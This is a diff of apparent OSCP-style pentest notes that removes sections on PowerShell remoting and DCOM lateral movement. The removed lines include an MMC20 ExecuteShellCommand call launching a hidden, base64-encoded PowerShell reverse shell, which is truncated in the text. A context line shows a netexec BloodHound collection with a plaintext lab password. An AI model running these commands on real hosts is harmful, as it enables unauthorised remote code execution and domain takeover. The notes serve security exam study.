@@ -743,22 +743,8 @@ netexec ldap dc01.oscp.exam -u web_svc -p 'Diamond1' --bloodhound -c all -ns 10.
 
 
 
-## Powershell Remoting
 
-```jsx
-Invoke-Command -ComputerName DC01 -ScriptBlock {ipconfig}
 
-$DC01Session = New-PSSession -ComputerName 'DC01'
-Enter-PSSession -Session $DC01Session
-```
-
-## DCOM
-
-```jsx
-$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
-
-$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
-AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
 ```
 
 # Port Forwarding
